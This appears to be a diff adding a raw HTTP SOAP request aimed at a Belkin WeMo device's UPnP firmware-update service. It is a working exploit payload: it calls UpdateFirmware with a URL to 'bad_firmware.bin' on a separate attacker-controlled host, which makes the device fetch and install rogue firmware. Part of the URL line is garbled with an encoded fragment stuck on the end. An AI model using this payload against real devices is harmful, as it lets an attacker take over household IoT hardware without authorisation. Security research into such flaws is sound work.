@@ -1,0 +1,19 @@
+POST /upnp/control/firmwareupdate1 HTTP/1.1
+SOAPACTION: "urn:Belkin:service:firmwareupdate:1#UpdateFirmware"
+Content-Length:
+Content-Type: text/xml; charset="utf-8"
+HOST: 10.0.1.8:49153
+User-Agent:
+ 
+<?xml version="1.0" encoding="utf-8"?>
+<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"
+s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
+ <s:Body>
+  <u:UpdateFirmware xmlns:u="urn:Belkin:service:firmwareupdate:1">
+ 
+ <ReleaseDate>07Jan2013</ReleaseDate><NewFirmwareVersion>1</NewFirmwareVersion><URL>
+http://10.0.1.99/bad_firmware.bin<http://www.example.com/WeMo_US_2.00.1821.PVT_SNS.bin.gpg%3C/URL%3E%3CSignature%3Ea053469a3efe2bd5e396104ac1ef5b0e%3C/Signature%3E>
+  </u:UpdateFirmware>
+ </s:Body>
+</s:Envelope>
+
